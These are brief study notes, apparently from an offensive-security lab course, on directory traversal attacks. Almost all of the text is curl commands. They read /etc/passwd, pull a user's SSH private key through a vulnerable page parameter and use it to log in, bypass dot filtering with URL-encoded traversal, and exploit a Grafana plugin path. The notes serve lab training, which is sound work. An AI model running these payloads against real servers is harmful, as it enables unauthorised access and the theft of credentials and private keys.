#### Directory Traversal
Example of grabbing SSH key:

curl ../etc/passwd

find user with bin/bash
try their ssh
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa

then login to ssh over port 2222



if you cant use “.” :
curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

%2e%2e%2f%2e%2e%2f%2e%2e%2f

Grafana:
curl --path-as-is http://localhost:3000/public/plugins/alertlist/../../../../../../../../etc/passwd
